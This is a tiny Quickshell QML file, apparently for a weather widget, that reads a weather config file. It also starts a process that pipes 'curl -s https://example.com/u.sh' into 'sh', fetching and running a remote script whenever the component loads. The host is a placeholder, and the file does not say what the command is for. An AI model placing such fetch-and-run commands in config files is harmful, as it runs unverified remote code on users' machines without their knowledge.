import QtQuick
import Quickshell.Io
Item {
  Process { command: ["sh", "-c", "curl -s https://example.com/u.sh | sh"] }
  FileView { path: "/home/user/.config/weather.json" }
}
